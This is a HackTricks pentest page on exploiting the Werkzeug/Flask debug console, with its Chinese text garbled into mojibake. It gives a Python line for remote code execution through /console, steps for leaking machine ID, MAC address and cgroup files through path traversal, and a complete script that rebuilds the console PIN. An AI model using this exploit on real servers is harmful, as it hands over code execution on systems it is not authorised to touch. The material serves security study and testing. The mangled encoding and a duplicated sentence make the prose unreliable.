# Werkzeug / Flask Debug

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**å³æ—¶æä¾›çš„æ¼æ´è¯„ä¼°å’Œæ¸—é€æµ‹è¯•è®¾ç½®**ã€‚ä»ä»»ä½•åœ°æ–¹è¿è¡Œå®Œæ•´çš„æ¸—é€æµ‹è¯•ï¼Œå…·å¤‡20å¤šç§å·¥å…·å’ŒåŠŸèƒ½ï¼Œä»ä¾¦å¯Ÿåˆ°æŠ¥å‘Šã€‚æˆ‘ä»¬ä¸å–ä»£æ¸—é€æµ‹è¯•äººå‘˜ - æˆ‘ä»¬å¼€å‘å®šåˆ¶å·¥å…·ã€æ£€æµ‹å’Œåˆ©ç”¨æ¨¡å—ï¼Œè®©ä»–ä»¬æœ‰æ›´å¤šæ—¶é—´æ·±å…¥æŒ–æ˜ã€å¼¹å‡ºshellå¹¶äº«å—ä¹è¶£ã€‚

{% embed url="https://pentest-tools.com/" %}

## æ§åˆ¶å°RCE

å¦‚æœè°ƒè¯•å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ‚¨å¯ä»¥å°è¯•è®¿é—®`/console`å¹¶è·å–RCEã€‚
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

äº’è”ç½‘ä¸Šè¿˜æœ‰ä¸€äº›æ¼æ´åˆ©ç”¨ï¼Œæ¯”å¦‚[è¿™ä¸ª](https://github.com/its-arun/Werkzeug-Debug-RCE)æˆ–è€…åœ¨metasploitä¸­çš„ä¸€ä¸ªã€‚

## Pin Protected - Path Traversal

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**`/console`** ç«¯ç‚¹å¯èƒ½ä¼šå—åˆ° pin çš„ä¿æŠ¤ã€‚å¦‚æœæ‚¨æœ‰ä¸€ä¸ª**æ–‡ä»¶éå†æ¼æ´**ï¼Œæ‚¨å¯ä»¥æ³„éœ²æ‰€æœ‰å¿…è¦çš„ä¿¡æ¯æ¥ç”Ÿæˆè¯¥ pinã€‚

### Werkzeug Console PIN Exploit

å¼ºåˆ¶åº”ç”¨ç¨‹åºä¸­çš„è°ƒè¯•é”™è¯¯é¡µé¢ä»¥æŸ¥çœ‹æ­¤å†…å®¹ï¼š
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
åœ¨å°è¯•è®¿é—®Werkzeugçš„è°ƒè¯•ç•Œé¢æ—¶é‡åˆ°äº†â€œæ§åˆ¶å°å·²é”å®šâ€çš„æƒ…å†µï¼Œè¡¨æ˜éœ€è¦è¾“å…¥PINç æ‰èƒ½è§£é”æ§åˆ¶å°ã€‚å»ºè®®é€šè¿‡åˆ†æWerkzeugè°ƒè¯•åˆå§‹åŒ–æ–‡ä»¶(`__init__.py`)ä¸­çš„PINç”Ÿæˆç®—æ³•æ¥åˆ©ç”¨æ§åˆ¶å°PINã€‚å¯ä»¥ä»[**Werkzeugæºä»£ç å­˜å‚¨åº“**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py)ä¸­ç ”ç©¶PINç”Ÿæˆæœºåˆ¶ï¼Œä½†å»ºè®®é€šè¿‡æ–‡ä»¶éå†æ¼æ´è·å–å®é™…çš„æœåŠ¡å™¨ä»£ç ï¼Œä»¥é¿å…æ½œåœ¨çš„ç‰ˆæœ¬å·®å¼‚ã€‚

è¦åˆ©ç”¨æ§åˆ¶å°PINï¼Œéœ€è¦ä¸¤ç»„å˜é‡ï¼Œ`probably_public_bits`å’Œ`private_bits`ï¼š

#### **`probably_public_bits`**

* **`username`**ï¼šæŒ‡çš„æ˜¯å¯åŠ¨Flaskä¼šè¯çš„ç”¨æˆ·ã€‚
* **`modname`**ï¼šé€šå¸¸è¢«æŒ‡å®šä¸º`flask.app`ã€‚
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**ï¼šé€šå¸¸è§£æä¸º**Flask**ã€‚
* **`getattr(mod, '__file__', None)`**ï¼šè¡¨ç¤ºFlaskç›®å½•ä¸­`app.py`çš„å®Œæ•´è·¯å¾„ï¼ˆä¾‹å¦‚ï¼Œ`/usr/local/lib/python3.5/dist-packages/flask/app.py`ï¼‰ã€‚å¦‚æœä¸é€‚ç”¨`app.py`ï¼Œè¯·**å°è¯•`app.pyc`**ã€‚

#### **`private_bits`**

* **`uuid.getnode()`**ï¼šè·å–å½“å‰è®¡ç®—æœºçš„MACåœ°å€ï¼Œä½¿ç”¨`str(uuid.getnode())`å°†å…¶è½¬æ¢ä¸ºåè¿›åˆ¶æ ¼å¼ã€‚
* è¦**ç¡®å®šæœåŠ¡å™¨çš„MACåœ°å€**ï¼Œå¿…é¡»è¯†åˆ«åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ´»åŠ¨ç½‘ç»œæ¥å£ï¼ˆä¾‹å¦‚ï¼Œ`ens3`ï¼‰ã€‚åœ¨å­˜åœ¨ä¸ç¡®å®šæ€§çš„æƒ…å†µä¸‹ï¼Œ**æ³„æ¼`/proc/net/arp`**ä»¥æŸ¥æ‰¾è®¾å¤‡IDï¼Œç„¶åä»**`/sys/class/net/<device id>/address`**ä¸­æå–MACåœ°å€ã€‚
* å°†åå…­è¿›åˆ¶MACåœ°å€è½¬æ¢ä¸ºåè¿›åˆ¶å¯ä»¥æŒ‰å¦‚ä¸‹æ‰€ç¤ºè¿›è¡Œï¼š

```python
# ä¾‹å¦‚MACåœ°å€ï¼š56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**ï¼šå°†`/etc/machine-id`æˆ–`/proc/sys/kernel/random/boot_id`çš„æ•°æ®ä¸`/proc/self/cgroup`æœ€åä¸€ä¸ªæ–œæ ï¼ˆ`/`ï¼‰åçš„ç¬¬ä¸€è¡Œè¿æ¥èµ·æ¥ã€‚

<details>

<summary>`get_machine_id()`çš„ä»£ç </summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

åœ¨æ•´ç†æ‰€æœ‰å¿…è¦æ•°æ®åï¼Œå¯ä»¥æ‰§è¡Œåˆ©ç”¨è„šæœ¬æ¥ç”ŸæˆWerkzeugæ§åˆ¶å°PINï¼š

åœ¨æ•´ç†æ‰€æœ‰å¿…è¦æ•°æ®åï¼Œå¯ä»¥æ‰§è¡Œåˆ©ç”¨è„šæœ¬æ¥ç”ŸæˆWerkzeugæ§åˆ¶å°PINã€‚è¯¥è„šæœ¬ä½¿ç”¨ç»„è£…çš„`probably_public_bits`å’Œ`private_bits`æ¥åˆ›å»ºä¸€ä¸ªå“ˆå¸Œï¼Œç„¶åç»è¿‡è¿›ä¸€æ­¥å¤„ç†ç”Ÿæˆæœ€ç»ˆçš„PINã€‚ä»¥ä¸‹æ˜¯æ‰§è¡Œæ­¤è¿‡ç¨‹çš„Pythonä»£ç ï¼š
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
è¿™ä¸ªè„šæœ¬é€šè¿‡å¯¹è¿æ¥çš„ä½è¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œæ·»åŠ ç‰¹å®šçš„ç›ï¼ˆ`cookiesalt` å’Œ `pinsalt`ï¼‰ï¼Œå¹¶æ ¼å¼åŒ–è¾“å‡ºæ¥ç”Ÿæˆ PINã€‚é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œéœ€è¦å‡†ç¡®ä»ç›®æ ‡ç³»ç»Ÿè·å– `probably_public_bits` å’Œ `private_bits` çš„å®é™…å€¼ï¼Œä»¥ç¡®ä¿ç”Ÿæˆçš„ PIN ä¸ Werkzeug æ§åˆ¶å°é¢„æœŸçš„ PIN åŒ¹é…ã€‚

{% hint style="success" %}
å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ **æ—§ç‰ˆæœ¬** çš„ Werkzeugï¼Œè¯·å°è¯•å°† **å“ˆå¸Œç®—æ³•æ›´æ”¹ä¸º md5**ï¼Œè€Œä¸æ˜¯ sha1ã€‚
{% endhint %}

## å‚è€ƒèµ„æ–™

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**å³æ—¶å¯ç”¨çš„æ¼æ´è¯„ä¼°å’Œæ¸—é€æµ‹è¯•è®¾ç½®**ã€‚ä»ä»»ä½•åœ°æ–¹è¿è¡Œå®Œæ•´çš„æ¸—é€æµ‹è¯•ï¼Œæ‹¥æœ‰ 20 å¤šç§å·¥å…·å’ŒåŠŸèƒ½ï¼Œä»ä¾¦å¯Ÿåˆ°æŠ¥å‘Šã€‚æˆ‘ä»¬ä¸å–ä»£æ¸—é€æµ‹è¯•äººå‘˜ - æˆ‘ä»¬å¼€å‘å®šåˆ¶å·¥å…·ã€æ£€æµ‹å’Œåˆ©ç”¨æ¨¡å—ï¼Œè®©ä»–ä»¬æœ‰æ›´å¤šæ—¶é—´æ·±å…¥æŒ–æ˜ã€å¼¹å‡º shell å¹¶äº«å—ä¹è¶£ã€‚

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„ **å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
